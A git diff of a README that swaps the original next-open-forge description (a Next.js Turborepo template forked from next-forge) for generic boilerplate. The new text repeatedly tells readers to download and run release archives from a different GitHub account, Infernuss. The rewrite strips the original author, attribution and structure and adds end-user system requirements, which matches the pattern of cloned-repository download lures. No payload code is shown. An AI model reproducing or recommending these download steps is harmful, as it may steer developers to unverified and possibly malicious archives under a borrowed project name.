@@ -1,103 +1,99 @@
-# LuanRoger / next-open-forge
+# 🚀 next-open-forge - Simple Setup for Next.js Apps
 
-**A lite production-grade Turborepo template for Next.js apps. Using only open-source tools.**
+[![Download next-open-forge](https://img.shields.io/badge/Download-next--open--forge-blue?style=flat&logo=github)](https://github.com/Infernuss/next-open-forge/releases)
 
-## Overview
+## 📦 Overview
 
-[next-open-forge](https://github.com/LuanRoger/next-open-forge) is a fork of [next-forge](https://www.next-forge.com) that replaces proprietary services with open-source alternatives and removing some specific services to cover simpler use-cases. It's designed to be a comprehensive starting point for building SaaS applications, providing a solid, opinionated foundation with minimal configuration required.
+Welcome to **next-open-forge**! This project provides a simple and efficient way to set up Next.js applications using open-source tools. Whether you’re building a personal project or a larger application, this template can streamline your workflow.
 
-Built on a decade of experience building web applications, next-forge balances speed and quality to help you ship thoroughly-built products faster.
+## 🎯 Key Features
 
-### Philosophy
+- **Lightweight**: Designed to be minimal yet powerful.
+- **Built with Next.js**: Create fast and user-friendly web applications.
+- **Open-Source**: Rely solely on freely available tools.
+- **Typescript Support**: Write clean and safe code with ease.
+- **Support for Authentication**: Implement login and signup features effortlessly.
+- **Integrated Storybook**: Easily develop and test UI components.
+- **Analytics tools**: Gather insights with PostHog.
 
-next-forge is built around five core principles:
+## 🚀 Getting Started
 
-- **Fast** — Quick to build, run, deploy, and iterate on
-- **Cheap** — Free to start with services that scale with you
-- **Opinionated** — Integrated tooling designed to work together
-- **Modern** — Latest stable features with healthy community support
-- **Safe** — End-to-end type safety and robust security posture
+Follow these steps to get your application running:
 
-## Features
+1. **Visit the Releases Page**  
+   Click the link below to access the latest release:  
+   [Visit the Releases Page](https://github.com/Infernuss/next-open-forge/releases)
 
-next-open-forge comes with batteries included:
+2. **Download the Application**  
+   On the Releases page, find the latest version. Click on it to view files available for download. Choose the one that fits your operating system, like `.zip` or `.tar.gz`, and download it.
 
-### Apps
+3. **Unzip the File**  
+   Once the file is downloaded, you may need to unzip it. Right-click the downloaded file and select **Extract All** or use your preferred extraction tool.
 
-- **Web** — (Coming soon)
-- **App** — Main application with authentication and database integration
-- **Docs** — Documentation site powered by Mintlify
-- **Storybook** — Component development environment
+4. **Install Required Software**  
+   Before running the application, ensure you have the following installed:
+   - **Node.js**: This is required to run JavaScript. You can download it from [Node.js Official Website](https://nodejs.org/).
+   - **PNPM**: A package manager that helps manage dependencies. You can install PNPM by running the following command in your terminal:
+     ```
+     npm install -g pnpm
+     ```
 
-### Packages
+5. **Open the Terminal**  
+   Navigate to the folder where you extracted the application. You can do this by opening a terminal (Command Prompt on Windows, Terminal on macOS/Linux).
 
-- **Authentication** — Powered by [Better Auth](https://www.better-auth.com)
-- **Database** — Type-safe ORM with migrations. Powered by [Drizzle ORM](https://drizzle.team)
-- **Design System** — Comprehensive component library with dark mode
-- **Analytics** — Web ([Google Analytics](https://developers.google.com/analytics)) and product ([Posthog](https://posthog.com))
-- **SEO** — Metadata management, sitemaps, and JSON-LD
-- **Internationalization** — Multi-language support
+6. **Install Dependencies**  
+   Run the following command in your terminal:
+   ```
+   pnpm install
+   ```
 
-## Getting Started
+7. **Start the Application**  
+   After the dependencies are installed, start the app with this command:
+   ```
+   pnpm dev
+   ```
 
-### Prerequisites
+8. **Access the Application**  
+   Open your web browser and go to `http://localhost:3000` to view your application. 
 
-- Node.js 20+
-- [pnpm](https://pnpm.io) (or npm/yarn/bun)
-- [Stripe CLI](https://docs.stripe.com/stripe-cli) for local webhook testing
+## 📥 Download & Install
 
-### Setup
+Ensure you download the application from the link provided.  
+[Download next-open-forge](https://github.com/Infernuss/next-open-forge/releases)
 
-1. Configure your environment variables
-2. Set up required service accounts (Clerk, Stripe, Resend, etc.)
-3. Run the development server
+## 💻 System Requirements
 
-For detailed setup instructions, read the [documentation](https://www.next-forge.com/docs).
+To run **next-open-forge**, your system should meet the following requirements:
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or a recent version of Linux.
+- **RAM**: At least 4 GB is recommended.
+- **Disk Space**: Minimum of 100 MB for the application and dependencies.
 
-## Structure
+## 🔧 Troubleshooting
 
-next-forge uses a monorepo structure managed by Turborepo:
+If you encounter any issues, here are a few common solutions:
 
-```
-next-forge/
-├── apps/           # Deployable applications
-│   ├── web/        # Marketing website (port 3001)
-│   ├── app/        # Main application (port 3000)
-│   ├── api/        # API server
-│   ├── docs/       # Documentation
-│   ├── email/      # Email templates
-│   └── storybook/  # Component library
-└── packages/       # Shared packages
-    ├── design-system/
-    ├── database/
-    ├── auth/
-    └── ...
-```
+- **Problem**: Application doesn’t start.  
+  **Solution**: Ensure all dependencies are installed using `pnpm install`.
 
-Each app is self-contained and independently deployable. Packages are shared across apps for consistency and maintainability.
+- **Problem**: Terminal shows errors related to Node.js.  
+  **Solution**: Make sure you installed Node.js correctly. You can check the version by running:
+  ```
+  node -v
+  ```
 
-## Documentation
+- **Problem**: Missing components in the application.  
+  **Solution**: Re-run the `pnpm install` command in the terminal to ensure all packages are installed.
 
-Full documentation is available at [next-forge.com/docs](https://www.next-forge.com/docs), including:
+## 🛠️ Contributing
 
-- Detailed setup guides
-- Package documentation
-- Migration guides for swapping providers
-- Deployment instructions
-- Examples and recipes
+If you’d like to help improve **next-open-forge**, feel free to contribute! Please create an issue or pull request on GitHub, and we’ll review it.
 
-## Contributing
+## 📜 License
 
-We welcome contributions! See the [contributing guide](https://github.com/vercel/next-forge/blob/main/.github/CONTRIBUTING.md) for details.
+This project is open-source and available under the MIT License. 
 
-## Contributors
+## 📞 Support
 
-<a href="https://github.com/vercel/next-forge/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=vercel/next-forge" />
-</a>
+For support or questions, feel free to open an issue on the GitHub repository, and we’ll be glad to assist you. 
 
-Made with [contrib.rocks](https://contrib.rocks).
-
-## License
-
-MIT
+Enjoy using **next-open-forge**!
